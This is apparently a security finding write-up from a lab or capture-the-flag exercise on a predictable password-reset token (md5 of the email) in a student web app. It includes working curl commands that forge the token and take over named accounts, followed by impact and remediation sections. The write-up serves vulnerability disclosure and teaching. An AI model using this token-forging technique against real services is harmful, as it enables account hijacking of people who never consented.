# Finding 07 — Weak password reset (predictable token + account takeover)

**Flag:** none observed (vulnerability confirmed; no unique flag string returned).
**Location:** `POST /reset-password/request` and `POST /reset-password/confirm`.
**Severity:** High
**Class:** Broken authentication — predictable reset token, no validation, no rate limit.

## Discovery

Benjamin's forum PSA: *"the password reset… the link worked instantly — no email, the token was just…"*. Requesting a reset redirects the browser straight to the reset page with the token in the URL — it is never emailed.

## Exploitation

1. Request a reset — the token is handed back in the `Location` header:

```
POST /reset-password/request  (email=jdoe@student.42.tech)
-> 302 Location: /reset-password?email=jdoe@student.42.tech&token=5ae99e7ca0a3fd84337cecfa705f5321
```

2. The token is simply `md5(email)` — fully predictable:

```bash
echo -n "jdoe@student.42.tech" | md5   # -> 5ae99e7ca0a3fd84337cecfa705f5321  (matches)
```

3. So any account can be taken over by forging the token and setting a new password:

```bash
E=benjamin@student.42.tech; TOK=$(echo -n "$E" | md5); NEWPW=PwnedPass123
curl -s -X POST "http://TARGET:4942/reset-password/confirm" \
  --data-urlencode "email=$E" --data-urlencode "token=$TOK" --data-urlencode "new_password=$NEWPW"
curl -s -i -X POST "http://TARGET:4942/login" \
  --data-urlencode "identity=$E" --data-urlencode "password=$NEWPW"   # -> 302 /  (logged in)
```

Confirmed takeover of `benjamin`, `thanos`, `dorian`. Staff/`god` accounts are unaffected because they authenticate via 42 SSO and have no local password.

## Impact

Any account with a local password can be hijacked by anyone who knows the email address, with no email access, no token guessing, and no rate limit. Email addresses follow the predictable `username@student.42.tech` pattern, so the whole student body is trivially compromisable.

## Remediation

- Generate reset tokens from a cryptographically secure random source, store them server-side hashed, bind them to the account, expire them quickly, and make them single-use.
- Deliver the token out-of-band (email) — never redirect the browser to it.
- Rate-limit reset requests and confirmations.
